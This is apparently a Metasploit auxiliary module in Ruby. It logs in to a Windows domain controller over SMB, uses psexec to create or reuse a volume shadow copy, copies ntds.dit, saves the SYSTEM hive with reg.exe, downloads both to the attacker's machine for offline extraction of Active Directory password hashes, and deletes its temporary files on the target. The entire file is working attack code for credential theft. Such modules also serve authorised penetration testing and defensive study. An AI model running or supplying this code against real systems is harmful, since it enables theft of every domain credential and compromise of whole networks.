require 'msf/core'
require 'msf/core/exploit/psexec'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::Psexec
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT= Rex::Proto::SMB::Exceptions
	CONST= Rex::Proto::SMB::Constants


	def initialize(info = {})
		super(update_info(info,
		'Name' => 'Windows Domain Controller - Download NTDS.dit and SYSTEM Hive',
			'Description'=> %q{This module authenticates to an Active Directory Domain Controller and creates
				a volume shadow copy of the %SYSTEMDRIVE%.It then pulls down copies of the ntds.dit file as well
				as the SYSTEM hive and stores them on your attacking machine.The ntds.dit and SYSTEM copy can be used
				in combination with other tools for offline extraction of AD password hashes.All of this is possible without
				uploading a single binary to the target host.
			},

			'Author' => [
				'Royce Davis @R3dy__ <rdavis[at]accuvant.com>'
			],

			'License'=> MSF_LICENSE,
			'References' => [
				[ 'URL', 'http://sourceforge.net/projects/smbexec' ],
				[ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ]
			],
		))

		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store the ntds.dit and SYSTEM hive', '/tmp/NTDS_Grab']),
			OptString.new('VSCPATH', [false, 'The path to the target Volume Shadow Copy', '']),
			OptString.new('WINPATH', [true, 'The name of the Windows directory (examples: WINDOWS, WINNT)', 'WINDOWS']),
			OptString.new('SYSDRIVE', [true, 'The root drive letter of the remote host', 'C:']),
		], self.class)

		deregister_options('RHOST')
	end


	def peer
		return "#{rhost}:#{rport}"
	end


	# This is the main control method
	def run_host(ip)
		# Initialize some variables
		text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
		bat = "#{datastore['SYSDRIVE']}\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
		createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
		logdir = datastore['LOGDIR']
		smbshare = datastore['SMBSHARE']
		remove_files = [bat, "#{datastore['SYSDRIVE']}#{text}", "#{datastore['SYSDRIVE']}#{datastore['WINPATH']}\\Temp\\ntds", "#{datastore['SYSDRIVE']}#{datastore['WINPATH']}\\Temp\\sys"]
		# Try and connect
		if connect
			#Try and authenticate with given credentials
			begin
				smb_login
			rescue StandardError => autherror
				print_error("Unable to authenticate with given credentials: #{autherror}")
				return
			end
			# If a VSC was specified then don't try and create one
			if datastore['VSCPATH'].length > 0
				print_status("#{peer} - Attempting to copy NTDS.dit from #{datastore['VSCPATH']}")
				vscpath = datastore['VSCPATH']
			else
				vscpath = check_vss(ip, text, bat)
				unless vscpath
					vscpath = make_volume_shadow_copy(ip, createvsc, text, bat)
				end
			end
			if vscpath
				if !(n = copy_ntds(ip, vscpath, text)) == false && !(s = copy_sys_hive(ip)) == false
					download_ntds(smbshare, (datastore['WINPATH'] + "\\Temp\\ntds"), ip, logdir)
					download_sys_hive(smbshare, (datastore['WINPATH'] + "\\Temp\\sys"), ip, logdir)
				else
					print_error("#{peer} - Failed to find a volume shadow copy.  Issuing cleanup command sequence.")
				end
			end
			remove_files.each { |file| register_file_for_cleanup(file) }
			cleanup_after
			disconnect
		end
	end


	# Thids method will check if a Volume Shadow Copy already exists and use that rather
	# then creating a new one
	def check_vss(ip, text, bat)
		begin
			print_status("#{ip} - Checking if a Volume Shadow Copy exists already.")
			prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
			command = "%COMSPEC% /C echo vssadmin list shadows ^> #{datastore['SYSDRIVE']}#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
			result = psexec(command)
			data = get_output(datastore['SMBSHARE'], ip, text)
			vscs = []
			data.each_line { |line| vscs << line if line.include?("GLOBALROOT") }
			if vscs.empty?
				print_status("#{ip} - No VSC Found.")
				return nil
			end
			vscpath = prepath + vscs[vscs.length - 1].to_s.split("ShadowCopy")[1].to_s.chomp
			print_good("#{ip} - Volume Shadow Copy exists on #{vscpath}")
			return vscpath
		rescue StandardError => vsscheckerror
			print_error("#{ip} - Unable to determine if VSS is enabled: #{vsscheckerror}")
			return nil
		end
	end


	# Create a Volume Shadow Copy on the target host
	def make_volume_shadow_copy(ip, createvsc, text, bat)
		begin
			#Try to create the shadow copy
			command = "%COMSPEC% /C echo #{createvsc} ^> #{datastore['SYSDRIVE']}#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
			print_status("Creating Volume Shadow Copy")
			out = psexec(command)
			#Get path to Volume Shadow Copy
			vscpath = get_vscpath(ip, text)
		rescue StandardError => vscerror
			print_error("Unable to create the Volume Shadow Copy: #{vscerror}")
			return nil
		end
		if vscpath
			begin
				cleanup = "%COMSPEC% /C del /F /Q %SYSTEMDRIVE%#{text} & del /F /Q #{bat}"
				# Run cleanup command
				out = psexec(cleanup)
			rescue StandardError => cleanuperror
				print_error("Cleanup Command failed: #{cleanuperror}")
				return nil
			end
			print_good("Volume Shadow Copy created on #{vscpath}")
			return vscpath
		else
			return nil
		end
	end


	# Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
	def copy_ntds(ip, vscpath, text)
		begin
			ntdspath = vscpath.to_s + "\\" + datastore['WINPATH'] + "\\NTDS\\ntds.dit"
			command = "%COMSPEC% /C copy /Y \"#{ntdspath}\" %WINDIR%\\Temp\\ntds"
			run = psexec(command)
			if !check_ntds(text)
				return false
			end
			return true
		rescue StandardError => ntdscopyerror
			print_error("Unable to copy ntds.dit from Volume Shadow Copy.Make sure target is a Windows Domain Controller: #{ntdscopyerror}")
			return false
		end
	end


	# Checks if ntds.dit was copied to the Windows Temp directory
	def check_ntds(text)
		print_status("#{peer} - Checking if NTDS.dit was copied.")
		check = "%COMSPEC% /C dir #{datastore['SYSDRIVE']}\\#{datastore['WINPATH']}\\Temp\\ntds > #{datastore['SYSDRIVE']}#{text}"
		run = psexec(check)
		output = get_output(datastore['SMBSHARE'], datastore['RHOST'], text)
		if output.include?("ntds")
			return true
		end
		return false
	end


	# Copies the SYSTEM hive file to the Temp directory on the target host
	def copy_sys_hive(ip)
		begin
			# Try to crate the sys hive copy
			command = "%COMSPEC% /C reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\sys /y"
			return psexec(command)
		rescue StandardError => hiveerror
			print_error("Unable to copy the SYSTEM hive file: #{hiveerror}")
			return false
		end
	end


	# Download the ntds.dit copy to your attacking machine
	def download_ntds(smbshare, file, ip, logdir)
		print_status("Downloading ntds.dit file")
		begin
			# Try to download ntds.dit
			newdir = "#{logdir}/#{ip}"
			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
			simple.connect("\\\\#{ip}\\#{smbshare}")
			remotefile = simple.open("#{file}", 'rob')
			data = remotefile.read
			#Save it to local file system
			file = File.open("#{logdir}/#{ip}/ntds", "wb+")
			file.write(data)
			file.close
			remotefile.close
		rescue StandardError => ntdsdownloaderror
			print_error("Unable to downlaod ntds.dit: #{ntdsdownloaderror}")
			return ntdsdownloaderror
		end
		simple.disconnect("\\\\#{ip}\\#{smbshare}")
	end


	# Download the SYSTEM hive copy to your attacking machine
	def download_sys_hive(smbshare, file, ip, logdir)
		print_status("Downloading SYSTEM hive file")
		begin
			# Try to download SYSTEM hive
			newdir = "#{logdir}/#{ip}"
			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
			simple.connect("\\\\#{ip}\\#{smbshare}")
			remotefile = simple.open("#{file}", 'rob')
			data = remotefile.read
			#Save it to local file system
			file = File.open("#{logdir}/#{ip}/sys", "wb+")
			file.write(data)
			file.close
			remotefile.close
		rescue StandardError => sysdownloaderror
			print_error("Unable to download SYSTEM hive: #{sysdownloaderror}")
			return sysdownloaderror
		end
	end


	# Gets the path to the Volume Shadow Copy
	def get_vscpath(ip, file)
		begin
			prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
			vsc = ""
			output = get_output(datastore['SMBSHARE'], ip, file)
			output.each_line do |line|
				vsc += line if line.include?("GLOBALROOT")
			end
			return prepath + vsc.split("ShadowCopy")[1].chomp
		rescue StandardError => vscpath_error
			print_error("Could not determine the exact path to the VSC check your WINPATH")
			return nil
		end
	end


end
